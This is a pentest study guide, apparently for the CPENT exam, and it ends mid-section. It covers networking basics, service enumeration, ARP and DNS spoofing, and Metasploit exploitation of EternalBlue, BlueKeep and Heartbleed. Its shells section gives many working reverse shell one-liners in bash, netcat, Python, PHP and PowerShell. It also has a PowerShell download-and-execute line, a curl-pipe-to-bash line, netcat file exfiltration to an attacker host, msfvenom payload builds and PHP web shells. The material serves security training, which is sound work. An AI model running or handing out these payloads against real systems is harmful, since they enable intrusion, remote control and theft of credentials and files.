# 01 - THE BASICS

> Foundation module: networking, protocols, vulnerabilities, shells, and methodology. Every later module assumes you already understand these concepts. Read this before any attack module.

**Zeeshan | GitHub: https://github.com/mzeeshanzafar28 | LinkedIn: https://www.linkedin.com/in/mzeeshanzafar28**

---

## Table of Contents

1. [Pentest Methodology](#1-pentest-methodology)
2. [Networking Fundamentals](#2-networking-fundamentals)
3. [Core Protocols & Services (with Ports)](#3-core-protocols--services-with-ports)
4. [Core Network Attacks](#4-core-network-attacks)
5. [Landmark Vulnerabilities](#5-landmark-vulnerabilities)
6. [PowerShell Essentials](#6-powershell-essentials)
7. [Linux Command Basics](#7-linux-command-basics)
8. [Shells & Payloads](#8-shells--payloads)
9. [Authentication Methods](#9-authentication-methods)
10. [Tools & Techniques Mapping](#10-tools--techniques-mapping)
11. [Mental Models](#11-mental-models)
12. [Practice Recommendations](#12-practice-recommendations)

---

## 1. Pentest Methodology

CPENT and real-world engagements follow standard phase models. Recognized frameworks worth knowing by name:

- **PTES** (Penetration Testing Execution Standard) — industry-standard methodology
- **OSSTMM** (Open Source Security Testing Methodology Manual)
- **NIST SP 800-115** — Technical Guide to Information Security Testing
- **MITRE ATT&CK** — matrix for mapping post-exploitation techniques

You don't need to recite these verbatim, but report-writing sections score higher when findings are framed against a recognized methodology.

### Standard Phases

```
1. Pre-engagement        → Scoping, rules of engagement, authorization
2. Information Gathering → Passive and active OSINT/recon
3. Scanning & Enumeration→ Live hosts, open ports, services, versions
4. Vulnerability Analysis→ Map services/versions to known weaknesses
5. Exploitation          → Gain initial access
6. Post-Exploitation     → Privilege escalation, lateral movement, pivoting, persistence
7. Reporting             → Document everything as you go, not at the end
```

### The Core Model for CPENT

Almost every scenario reduces to:

```
Understand the environment → Discover systems → Enumerate services →
Understand the protocol → Identify weakness → Exploit → Obtain access →
Enumerate again → Escalate privileges → Move laterally / pivot → Reach objective →
Collect evidence → Report
```

**The important word is `understand`.** A port is not an attack. A version is not automatically a vulnerability. A CVE is not automatically exploitable.

---

## 2. Networking Fundamentals

### 2.1 OSI Model vs TCP/IP Model

| OSI Layer | TCP/IP Layer | Examples | Pentesting Relevance |
|-----------|-------------|----------|---------------------|
| 7 Application | Application | HTTP, DNS, SMB, LDAP, FTP | Application/service attacks |
| 6 Presentation | Application | TLS/SSL, encoding | Encryption/encoding issues |
| 5 Session | Application | NetBIOS sessions, session mgmt | Authentication/session attacks |
| 4 Transport | Transport | **TCP**, **UDP** | Ports, scanning, filtering |
| 3 Network | Internet | **IPv4**, IPv6, **ICMP**, ARP | Routing, discovery, segmentation |
| 2 Data Link | Network Access | Ethernet, **MAC** addressing, Wi-Fi | MITM, ARP, local network attacks |
| 1 Physical | Network Access | Cables, radio | Wireless/physical attacks |

**Why this matters:** ARP scanning only works at Layer 2 (same subnet only). SYN scans operate at Layer 4. Pivoting decisions depend on which layer you're operating at.

### 2.2 TCP vs UDP

| Property | TCP | UDP |
|----------|-----|-----|
| Connection-oriented | Yes (3-way handshake) | No (connectionless) |
| Reliability | Built-in | Application dependent |
| Ordering | Guaranteed | No guarantee |
| Common scan | `nmap -sS` | `nmap -sU` |
| Typical services | HTTP(80), SSH(22), SMB(445), RDP(3389) | DNS(53), SNMP(161), NTP(123), NFS(2049) |

**TCP Three-Way Handshake:**
```
Client                         Server
  |                               |
  | -------- SYN ---------------> |
  | <------ SYN/ACK ------------ |
  | -------- ACK ---------------> |
  |                               |
```

Key TCP flags: SYN, ACK, FIN, RST, PSH, URG

**UDP scanning caveat:** Lack of response often just means filtered, not closed. UDP is harder to scan reliably.

### 2.3 ICMP

Used for network control and diagnostic messages:
- Echo Request / Echo Reply (ping)
- Destination Unreachable
- Time Exceeded (traceroute)

```bash
ping TARGET_IP       # Host discovery
ping -c 4 TARGET_IP  # Limit to 4 packets
```

**Ping is not proof a host is down when no response comes back** — firewalls may filter ICMP. Use alternative discovery methods.

### 2.4 TTL (Time To Live)

TTL limits packet lifetime across routed networks. Quick OS hint from ping replies:

| Initial TTL | Typical OS |
|-------------|-----------|
| ~64 | Linux/Unix-family host |
| ~128 | Windows host |
| ~255 | Network devices/routers, some Unix |

TTL decreases by 1 per hop. Use as a **hint only** — confirm with `nmap -O` or service banners. TTL alone is not reliable OS identification.

### 2.5 IPv4 Addressing & CIDR

An IPv4 address is 32 bits: `192.168.1.10` (four decimal octets, 0-255 each).

**Private IPv4 ranges (RFC 1918):**

| Range | CIDR |
|-------|------|
| 10.0.0.0 – 10.255.255.255 | 10.0.0.0/8 |
| 172.16.0.0 – 172.31.255.255 | 172.16.0.0/12 |
| 192.168.0.0 – 192.168.255.255 | 192.168.0.0/16 |

These are not globally routable — they're what you'll find behind NAT and inside pivoted segments.

**Common subnets:**

| CIDR | Subnet Mask | Approx. Hosts | Common Use |
|------|-------------|---------------|------------|
| /32 | 255.255.255.255 | 1 | Single host/route |
| /30 | 255.255.255.252 | 2 usable | Point-to-point links |
| /24 | 255.255.255.0 | 254 usable | Common LAN |
| /16 | 255.255.0.0 | 65,534 | Large internal network |
| /8 | 255.0.0.0 | 16,777,214 | Very large address space |

### 2.6 MAC Addresses

A MAC address identifies a network interface at Layer 2. Format: `00:11:22:33:44:55`

```bash
# Linux
ip link        # or: ip addr

# Windows
ipconfig /all
```

MAC addresses are not routable — local-network communication only.

### 2.7 Routing & Default Gateway

The default gateway is the router used when a host needs to reach a network for which it has no more specific route.

```bash
# Linux
ip route
# Example: default via 192.168.1.1 dev eth0

# Windows
route print
```

**Why this matters:** A compromised host may have access to networks the attacking machine cannot directly reach → basis of pivoting.

### 2.8 NAT (Network Address Translation)

NAT maps private internal addresses to a public IP at a gateway/firewall.

```
Private host (192.168.1.20) → NAT router → Public Internet
```

**Red team impact:** Internal ranges discovered post-pivot won't be directly reachable from outside. Pivoting exists specifically to get traffic translated into that internal address space. NAT also affects:
- Reachability and source addresses
- Port forwarding and reverse connections
- Lab networking configurations

---

## 3. Core Protocols & Services (with Ports)

> For each protocol: port number, what it does, how a red teamer approaches it, and step-by-step exploitation path.

### 3.1 ARP (Address Resolution Protocol) — Layer 2, No Port

**What it is:** Maps an IP address to a MAC address on the local subnet. A host broadcasts "Who has 192.168.1.10?" and the owner replies with its MAC.

**Why it matters:** No authentication built in — this makes ARP cache poisoning possible. ARP queries precede ICMP when target is on same subnet, so ARP scanning works even when ICMP is filtered. Only works within the same broadcast domain (same subnet/VLAN).

```bash
# View local ARP cache
arp -a                              # Linux & Windows
ip neigh                            # Modern Linux

# Clear ARP cache (Linux)
sudo ip -s -s neigh flush all

# ARP scan with nmap (same subnet only)
sudo nmap -PR -sn TARGET_SUBNET/24
```

### 3.2 DNS (Domain Name System) — TCP/UDP 53

**What it is:** Translates hostnames to IP addresses (and vice versa). Zone transfers (AXFR) can leak entire internal DNS zones if misconfigured.

**Key record types:**

| Record | Purpose |
|--------|---------|
| A | Name → IPv4 |
| AAAA | Name → IPv6 |
| CNAME | Alias / canonical name |
| MX | Mail server |
| NS | Authoritative nameserver |
| TXT | Arbitrary text (SPF, verification, data exfil) |
| PTR | Reverse DNS (IP → hostname) |
| SOA | Zone authority information |
| SRV | Service location (critical in AD for finding DCs) |

**Commands:**

```bash
# Forward lookups
dig DOMAIN A
dig DOMAIN ANY
nslookup DOMAIN

# Reverse lookup (IP → hostname)
dig -x TARGET_IP
nmap -R TARGET_IP                    # Force reverse DNS during scan

# Zone transfer attempt
dig AXFR @DNS_SERVER DOMAIN
dnsrecon -d DOMAIN -a

# DNS brute force
nmap --script dns-brute TARGET_IP
dnsmap DOMAIN
fierce --domain DOMAIN
gobuster dns -d DOMAIN -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Reverse DNS:** Given an IP, find the hostname via PTR record. A response like `dc01.corp.local` immediately tells you it's a domain controller.

### 3.3 SMB (Server Message Block) — TCP 445 (modern), TCP 139 (NetBIOS legacy)

**What it is:** Windows' native file/printer sharing and inter-process communication protocol. Backbone of Windows network attacks. SAMBA is the open-source Linux implementation.

**Why it matters:** Misconfigured or legacy SMB is one of the highest-value initial-access and lateral-movement vectors in Windows/AD engagements.

**Red team goals:**
- Null session enumeration
- Share discovery and file download
- Pass-the-Hash / Pass-the-Ticket
- EternalBlue (MS17-010) and other RCE
- NTLM authentication relaying

**Exploitation path:**

```bash
# Step 1: Confirm SMB is up and check version
nmap -p 445,139 -sV TARGET_IP
nmap -p445 --script smb-protocols,smb2-security-mode TARGET_IP

# Step 2: Enumerate shares (null session / anonymous)
smbclient -L //TARGET_IP/ -N
crackmapexec smb TARGET_IP -u '' -p '' --shares
enum4linux TARGET_IP

# Step 3: Connect to a share (anonymous or with creds)
smbclient //TARGET_IP/SHARE_NAME -N           # anonymous
smbclient //TARGET_IP/SHARE_NAME -U USERNAME  # authenticated

# Step 4: Inside smbclient — download everything
smb: \> dir
smb: \> recurse on
smb: \> prompt off
smb: \> mget *

# Step 5: Check for Groups.xml (SYSVOL credential leakage)
# Look in shares for cpassword values → decrypt with gpp-decrypt

# Step 6: Check for EternalBlue vulnerability
nmap -p445 --script smb-vuln-ms17-010 TARGET_IP

# Step 7: If version is vulnerable → Metasploit or manual exploit
```

### 3.4 RPC (Remote Procedure Call) — TCP/UDP 111 (rpcbind/portmapper), TCP 135 (MSRPC Windows)

**What it is:** Framework letting a program on one machine execute code on another. Windows uses MSRPC heavily for management (TCP 135 for endpoint mapper, plus dynamic high ports). Unix uses RPC for NFS/NIS services.

**Why it matters:** `rpcinfo` enumeration reveals services behind dynamic ports you can't get from port scans alone. On Windows, RPC (135) enumeration reveals internal service structure and is a precursor to DCOM/WMI-based lateral movement.

```bash
# Unix/Linux RPC enumeration
rpcinfo -p TARGET_IP                  # Shows registered RPC services
nmap -sV -p111 --script rpcinfo TARGET_IP

# Windows MSRPC enumeration
rpcclient -U "" TARGET_IP            # Anonymous connection
rpcclient -U "USERNAME" TARGET_IP    # Authenticated

# Inside rpcclient:
rpcclient $> enumdomusers             # Enumerate domain users
rpcclient $> enumdomgroups            # Enumerate domain groups
rpcclient $> queryuser USERNAME       # Get user details
rpcclient $> lsaenumsid               # Enumerate SIDs

# Nmap MSRPC scripts
nmap -sV -p135 --script msrpc-enum TARGET_IP
```

### 3.5 NFS (Network File System) — TCP/UDP 2049 (+ mountd on dynamic port via RPC 111)

**What it is:** Unix/Linux native network file-sharing protocol. `mountd` handles mount requests for NFS.

**Why it matters:** NFS exports are frequently misconfigured with world-readable/writable access and `no_root_squash` (lets you write files as root on the export).

**Exploitation path:**

```bash
# Step 1: Enumerate RPC services first
rpcinfo -p TARGET_IP

# Step 2: List exported shares
showmount -e TARGET_IP
nmap --script nfs-showmount TARGET_IP

# Step 3: Mount the share
sudo mkdir /mnt/nfs_target
sudo mount -t nfs TARGET_IP:/EXPORTED_PATH /mnt/nfs_target -o nolock

# Step 4: Browse and inspect
ls -la /mnt/nfs_target
cat /mnt/nfs_target/etc/shadow 2>/dev/null

# Step 5: Check export options — if no_root_squash:
# Create a SUID shell on your attack box as root:
# cp /bin/bash /mnt/nfs_target/suid_shell
# chmod 4777 /mnt/nfs_target/suid_shell
# Then execute on the target to get root shell
```

### 3.6 LDAP / LDAPS — TCP 389 (LDAP), TCP 636 (LDAPS), Global Catalog 3268/3269

**What it is:** Protocol Active Directory uses to store and query directory information (users, groups, computers, OUs, policies). Backbone of AD.

**Why it matters:** Anonymous or low-privilege LDAP binds can dump entire directory structure, usernames, group memberships, and descriptions (which sometimes contain passwords).

```bash
# Step 1: Check for anonymous bind
nmap -n -sV --script "ldap* and not brute" TARGET_IP
ldapsearch -x -H ldap://DC_IP -b "dc=DOMAIN,dc=com"

# Step 2: Authenticated enumeration
ldapsearch -x -H ldap://DC_IP -D "USERNAME@DOMAIN" -W -b "dc=DOMAIN,dc=com"

# Step 3: Dump all users
ldapsearch -x -H ldap://DC_IP -D "USERNAME@DOMAIN" -W \
  -b "dc=DOMAIN,dc=com" "(objectClass=user)" sAMAccountName

# Step 4: For full AD enumeration, use BloodHound (see AD module)
bloodhound-python -d DOMAIN -u USERNAME -p PASSWORD -ns DC_IP -c All
```

### 3.7 RDP (Remote Desktop Protocol) — TCP 3389

**What it is:** Microsoft's native remote GUI access protocol.

**Why it matters:** Common lateral-movement and initial-access target. Directly relevant to BlueKeep (CVE-2019-0708).

```bash
# Step 1: Confirm and enumerate RDP
nmap -p 3389 -sV TARGET_IP
nmap -p 3389 --script rdp-enum-encryption TARGET_IP
nmap -p 3389 --script rdp-vuln-ms12-020 TARGET_IP    # BlueKeep check

# Step 2: Brute-force (if in scope)
hydra -L users.txt -P passwords.txt rdp://TARGET_IP

# Step 3: Connect with creds
xfreerdp /u:USERNAME /p:'PASSWORD' /v:TARGET_IP
xfreerdp /u:USERNAME /pth:NTHASH /v:TARGET_IP        # Pass-the-Hash

# Step 4: Check patch level against BlueKeep
# Use Metasploit: auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

### 3.8 Telnet — TCP 23

**What it is:** Legacy unencrypted remote administration protocol. All traffic and credentials in cleartext.

**Why it matters:** If open in a modern environment, almost always a finding by itself. Credentials can be sniffed off the wire. Still appears on IoT and legacy devices.

```bash
# Connect / banner-grab
telnet TARGET_IP

# Brute-force
hydra -L users.txt -P passwords.txt telnet://TARGET_IP

# If on-path (MITM): capture in Wireshark — cleartext
wireshark -k -i eth0 -f "tcp port 23"
```

### 3.9 Finger Protocol — TCP 79

**What it is:** Legacy Unix service that returns information about logged-in users (username, last login, real name). Largely obsolete but still appears in older CPENT-style labs.

**Why it matters:** Free username enumeration with zero authentication. Harvested usernames feed brute-force attacks against SSH/RDP/SMB.

```bash
# List all logged-in users
finger @TARGET_IP

# Get details on a specific user
finger USERNAME@TARGET_IP

# Feed harvested usernames into brute-force:
hydra -L finger_users.txt -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
```

### 3.10 Other Critical Ports (Quick Reference)

| Port | Protocol/Service | Key Pentesting Use |
|------|-----------------|-------------------|
| **21** | FTP | Anonymous access, cleartext auth, file upload |
| **22** | SSH | Remote access, tunneling (-D, -L, -R), key/password auth |
| **25** | SMTP | Mail enumeration (VRFY), open relay |
| **53** | DNS | Zone transfers, subdomain enumeration |
| **80/443** | HTTP/HTTPS | Web applications, APIs |
| **88** | Kerberos | AD authentication, Kerberoasting, AS-REP roasting |
| **110/143** | POP3/IMAP | Mail credential harvesting |
| **135** | MSRPC | Windows RPC enumeration |
| **139** | NetBIOS | Legacy SMB/Windows name service |
| **161/162** | SNMP | Device enumeration, community strings (public/private) |
| **389/636** | LDAP/LDAPS | Directory enumeration |
| **445** | SMB | File shares, lateral movement, AD attacks |
| **502** | Modbus | OT/SCADA (industrial control) |
| **1433** | MSSQL | Database attacks |
| **2049** | NFS | Unix file share enumeration |
| **3306** | MySQL | Database attacks |
| **3389** | RDP | Windows remote desktop |
| **5432** | PostgreSQL | Database attacks |
| **5985/5986** | WinRM | Windows remote management (HTTP/HTTPS) |
| **6379** | Redis | In-memory database (often unauthenticated) |
| **8080/8443** | HTTP-alt | Web apps, proxies, admin interfaces |
| **27017** | MongoDB | NoSQL database |
| **11211** | Memcached | Caching (can leak data) |

> **Important:** A port number does not prove the service. Always confirm with enumeration.

---

## 4. Core Network Attacks

### 4.1 ARP Cache Poisoning (ARP Spoofing)

**Concept:** ARP has no authentication. You broadcast forged ARP replies telling the victim your MAC owns the gateway's IP (and vice versa), inserting yourself as MITM. Only works within same L2 broadcast domain (same subnet/VLAN).

**Path:**

```bash
# Step 1: Enable IP forwarding on attack box
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
# or: sudo sysctl -w net.ipv4.ip_forward=1

# Step 2: Poison victim (you are the gateway)
sudo arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP

# Step 3: Poison gateway (you are the victim)
sudo arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP

# Step 4: Capture traffic
sudo tcpdump -i eth0 -w capture.pcap
# or in Wireshark with filter: ip.addr == VICTIM_IP

# Step 5: Look for cleartext creds (Telnet, HTTP, FTP) or hashes
```

**Tools:** `arpspoof` (dsniff), **Ettercap**, **bettercap** (modern, preferred), **Cain & Abel** (Windows-only, legacy)

### 4.2 DNS Spoofing

**Concept:** Once positioned as MITM (usually via ARP poisoning), intercept DNS queries and return forged responses, pointing victim's browser at your attacker-controlled IP.

**Path:**

```bash
# Step 1: ARP poison the victim first (see above)

# Step 2: Create hosts file for spoofing
echo "TARGET_IP  www.example.com" > dns_hosts.txt

# Step 3: Run DNS spoofing
sudo dnsspoof -i eth0 -f dns_hosts.txt

# Step 4: Serve a cloned login page or payload on your web server
python3 -m http.server 80
```

**Tools:** `dnsspoof`, `ettercap` (with `etter.dns` file), `bettercap` (dns.spoof module)

### 4.3 ProxyChains

Not an attack itself — a tool for routing traffic through proxies/SOCKS tunnels. Essential for pivoting through compromised hosts.

```bash
# Config: /etc/proxychains4.conf
# Recommended settings:
#   dynamic_chain
#   proxy_dns
#   tcp_read_time_out 15000
#   tcp_connect_time_out 8000
#   [ProxyList]
#   socks5 127.0.0.1 1080

# Usage: prepend proxychains to any command
proxychains nmap -sT -Pn -p 445,3389 INTERNAL_TARGET
proxychains crackmapexec smb 172.16.20.0/24 -u USER -p 'PASSWORD'

# CRITICAL: Use -sT -Pn with nmap over proxychains
# SYN scans and host discovery do NOT work reliably through SOCKS
```

**For double pivots:** Add a second `socks5` line in ProxyList and use `dynamic_chain`. Full workflow in the Pivoting module.

---

## 5. Landmark Vulnerabilities

> Know what each is, what it affects, and the practical exploitation path — not just the name.

### 5.1 EternalBlue (CVE-2017-0144) — SMB, TCP 445

**What it is:** NSA-developed exploit (leaked by Shadow Brokers) targeting a buffer overflow in Microsoft's SMBv1. Used to spread WannaCry and NotPetya.

**Affects:** Unpatched Windows Vista through Server 2016 with SMBv1 enabled.

**Exploitation path:**

```bash
# Step 1: Confirm SMBv1 vulnerability
nmap -p445 --script smb-vuln-ms17-010 TARGET_IP

# Step 2: Metasploit exploitation
msfconsole -q
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS TARGET_IP
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST YOUR_IP
msf6 > set LPORT 4444
msf6 > exploit

# Lands SYSTEM-level meterpreter shell directly — no credentials required
```

### 5.2 BlueKeep (CVE-2019-0708) — RDP, TCP 3389

**What it is:** Pre-authentication RCE in Windows RDP (Remote Desktop Services). Wormable like EternalBlue but notoriously fragile — can BSOD the target if target-type isn't matched exactly.

**Affects:** Windows 7, Server 2008/2008 R2, and older with RDP enabled and unpatched.

```bash
# Step 1: Confirmation
nmap -p3389 --script rdp-vuln-ms12-020 TARGET_IP
# Or dedicated BlueKeep scanner:
# Metasploit: auxiliary/scanner/rdp/cve_2019_0708_bluekeep

# Step 2: Exploit (set target OS carefully)
msf6 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
msf6 > set RHOSTS TARGET_IP
msf6 > set target <choose exact OS match>
msf6 > exploit

# ⚠ WARNING: High risk of crashing production systems. Confirm scope/permission.
```

### 5.3 Heartbleed (CVE-2014-0160) — TLS/SSL (commonly HTTPS 443)

**What it is:** Buffer over-read in OpenSSL's TLS heartbeat extension. Tricks server into returning up to 64KB of adjacent process memory — can leak private keys, session tokens, or credentials.

**Affects:** Servers running OpenSSL 1.0.1 through 1.0.1f (unpatched).

```bash
# Step 1: Detect
nmap -p443 --script ssl-heartbleed TARGET_IP
sslscan TARGET_IP | grep -i openssl

# Step 2: Exploit (public PoCs or Metasploit)
msf6 > use auxiliary/scanner/ssl/openssl_heartbleed
msf6 > set RHOSTS TARGET_IP
msf6 > set RPORT 443
msf6 > set ACTION DUMP      # Grab leaked memory
msf6 > run

# Step 3: Grep the memory dump
grep -iE 'Cookie:|Authorization:|-----BEGIN.*PRIVATE KEY-----' memory_dump.txt
```

### 5.4 Buffer Overflow (Concept)

**What it is:** Writing more data into a fixed-size buffer than it can hold, overwriting adjacent memory — including the return address / instruction pointer (EIP/RIP) if positioned correctly. Controlling what overwrites the return address means controlling what the CPU executes next.

**Why it matters for CPENT:** Full domain in the Binary range. For CPENT you must:
1. Read binaries in a debugger
2. Find the crash offset (where input overflows)
3. Control EIP (instruction pointer)
4. Handle bad characters in shellcode
5. Find a JMP ESP or equivalent gadget
6. Write and inject shellcode
7. Bypass protections (ASLR, DEP/NX, canaries) via ROP when needed

**Key concept flow:**
```
Fuzz application → Find crash offset → Overwrite EIP → Control execution →
Place shellcode → Redirect to shellcode → Get shell
```

**CPENT focuses on 32-bit binaries.** Covered in depth in the Binary Exploitation module.

---

## 6. PowerShell Essentials

PowerShell commands follow Verb-Noun structure (e.g., `Get-Process`, `Sort-Object`).

### 6.1 Execution Policy Bypass

```powershell
powershell -ExecutionPolicy Bypass
# or inside a session:
Set-ExecutionPolicy Bypass -Scope Process
```

### 6.2 Core Enumeration Commands

```powershell
# === IDENTITY ===
whoami
whoami /priv
whoami /groups
hostname
systeminfo

# === USERS & GROUPS ===
net user
net user USERNAME
net localgroup
net localgroup administrators
net group /domain
net group "Domain Admins" /domain
net accounts                        # Account policies

# === NETWORK ===
ipconfig /all
route print
arp -a
netstat -ano

# === PROCESSES & SERVICES ===
Get-Process
Get-Service
Get-Service | Where-Object {$_.Status -eq 'Running'}
Get-Process | Sort-Object -Property CPU -Descending

# === FILES ===
Get-ChildItem
Get-ChildItem -Force               # Show hidden
Get-ChildItem -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -like "*pass*"}
Get-Content FILE.txt
Get-FileHash FILE.exe -Algorithm MD5

# === HELP & DISCOVERY ===
Get-Command
Get-Command -Name *user*
Get-Help Get-Process -Examples
```

### 6.3 Useful One-Liners

```powershell
# Search for files containing "password"
Select-String -Path C:\Users\*\* -Pattern "password" -ErrorAction SilentlyContinue

# Find all writable directories
Get-ChildItem C:\ -Recurse -Directory -ErrorAction SilentlyContinue | Where-Object {$_.Attributes -match "Directory"} | Get-Acl | Where-Object {$_.AccessToString -match "Everyone.*Allow.*Write"}

# Download a file from attacker machine
IWR -Uri http://YOUR_IP/shell.exe -OutFile C:\Windows\Temp\shell.exe
Invoke-WebRequest http://YOUR_IP/nc.exe -OutFile C:\Windows\Temp\nc.exe

# Execute reverse shell
C:\Windows\Temp\nc.exe YOUR_IP 4444 -e cmd.exe

# Check firewall state
netsh advfirewall show allprofiles

# List scheduled tasks
schtasks /query /fo LIST /v

# View installed hotfixes (patch level)
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

---

## 7. Linux Command Basics

```bash
# === IDENTITY & SYSTEM ===
id
whoami
uname -a
cat /etc/os-release
hostname
cat /etc/passwd
cat /etc/shadow                      # Needs root
lsb_release -a

# === NETWORK ===
ip a
ip route
arp -a
cat /etc/hosts
ss -tulnp                            # Modern replacement for netstat
netstat -tulnp                       # Legacy

# === FILES & PERMISSIONS ===
ls -la
find / -perm -4000 -type f 2>/dev/null      # SUID binaries
find / -perm -2000 -type f 2>/dev/null      # SGID binaries
find / -writable -type d 2>/dev/null        # World-writable dirs
find / -writable -type f 2>/dev/null        # World-writable files

# === PROCESSES ===
ps aux
ps aux | grep root
ps -ef --forest                      # Process tree view

# === CRONTAB / SCHEDULED ===
cat /etc/crontab
ls -la /etc/cron.*
systemctl list-timers --all

# === SUID / CAPABILITIES ===
getcap -r / 2>/dev/null
sudo -l                              # Check sudo permissions

# === FILE TRANSFER (from target to attacker) ===
# On attacker:
nc -lvnp 4444 > received_file
# On target:
nc YOUR_IP 4444 < /path/to/file

# Python HTTP server (attacker side):
python3 -m http.server 80
# On target:
wget http://YOUR_IP/tool -O /tmp/tool
curl http://YOUR_IP/shell.sh | bash
```

---

## 8. Shells & Payloads

### 8.1 Shell Types

**Bind Shell:** Target listens on a port; attacker connects to it.
```
Attacker ──connect──→ Target (listening on port XXXX)
```

**Reverse Shell:** Target connects back to attacker's listener.
```
Attacker (listening on port 4444) ←──connect── Target
```
Reverse shells are preferred in CPENT — they bypass NAT and many firewall rules.

### 8.2 Common Reverse Shell One-Liners

```bash
# === LINUX ===
# Bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

# Netcat (traditional)
nc -e /bin/bash YOUR_IP 4444

# Netcat (without -e flag)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc YOUR_IP 4444 > /tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP
php -r '$s=fsockopen("YOUR_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# === WINDOWS ===
# Netcat
nc.exe YOUR_IP 4444 -e cmd.exe

# PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/Invoke-PowerShellTcp.ps1')"

# PowerShell one-liner
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### 8.3 Metasploit Reverse Shells (msfvenom)

```bash
# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell.elf

# Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe

# PHP
msfvenom -p php/reverse_php LHOST=YOUR_IP LPORT=4444 -f raw -o shell.php

# Python
msfvenom -p python/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw -o shell.py

# ASP / ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f aspx -o shell.aspx

# JSP (Java)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw -o shell.jsp
```

### 8.4 Listener (Always Set Up Before Deploying Shell)

```bash
# Netcat
nc -lvnp 4444

# Metasploit multi/handler
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST YOUR_IP
msf6 > set LPORT 4444
msf6 > exploit -j
```

### 8.5 Shell Stabilization

After catching a simple reverse shell:

```bash
# Python PTY (best for Linux)
python3 -c 'import pty; pty.spawn("/bin/bash")'
# or: python -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm

# Script command
script /dev/null -c bash
# Ctrl+Z → stty raw -echo; fg → reset → export TERM=xterm-256color

# Set terminal size (on your machine first):
stty -a    # Note rows and columns
# Back in the shell:
stty rows ROWS columns COLS
```

### 8.6 Web Shells

```bash
# Weevely (PHP webshell generator + manager)
weevely generate PASSWORD /tmp/agent.php
weevely http://TARGET_IP/uploads/agent.php PASSWORD

# Simple PHP webshell (upload as .php file)
<?php echo shell_exec($_GET['cmd']); ?>
# Usage: http://TARGET_IP/shell.php?cmd=id

# More robust PHP webshell
<?php system($_REQUEST['cmd']); ?>
```

---

## 9. Authentication Methods

### 9.1 Authentication vs Authorization

| Concept | Question |
|---------|----------|
| **Authentication** | "Who are you?" |
| **Authorization** | "What are you allowed to do?" |

A vulnerability may exist even when authentication is correctly implemented. Always test both independently.

### 9.2 Common Authentication Mechanisms

**Username + Password (local):**
- Stored in `/etc/shadow` (Linux) or SAM database (Windows)
- Can be dumped with `mimikatz`, `secretsdump.py`, or by reading files with elevated privileges

**Username + Private Key (SSH):**
- Private keys in `~/.ssh/id_rsa` — if found, use with `ssh -i key user@TARGET`

**NTLM / NTLMv2 (Windows):**
- Challenge-response authentication
- Vulnerable to Pass-the-Hash (use NTLM hash directly without knowing password)
- NTLMv2 is stronger than NTLM but still crackable with `hashcat -m 5600`

**Kerberos (Active Directory):**
- Ticket-based: TGT (Ticket Granting Ticket), TGS (Service Ticket)
- Components: KDC, AS (Authentication Service), TGS (Ticket Granting Service)
- Attacks: Kerberoasting (`hashcat -m 13100`), AS-REP roasting, Golden/Silver Tickets, Pass-the-Ticket

**HTTP Basic Authentication:**
- Credentials sent as `Base64(username:password)` — **encoding, NOT encryption**
- Must be protected by HTTPS; without it, cleartext exposure

**Sessions & Cookies:**
- Inspect: session identifier, expiration, Secure/HttpOnly/SameSite flags, predictability, rotation
- Attack: session fixation, session theft, session prediction, missing invalidation

**LDAP Bind:**
- Simple bind (username + password) or SASL
- Anonymous binds (no credentials) may still return directory data if misconfigured

### 9.3 Key Authentication Attacks

```bash
# Password spraying (one password, many users)
crackmapexec smb TARGET_IP -u users.txt -p 'Spring2024!' --continue-on-success

# Pass-the-Hash
crackmapexec smb TARGET_IP -u USERNAME -H NTLM_HASH
impacket-psexec -hashes :NTLM_HASH DOMAIN/USERNAME@TARGET_IP

# Kerberoasting
impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
# Then crack the hash:
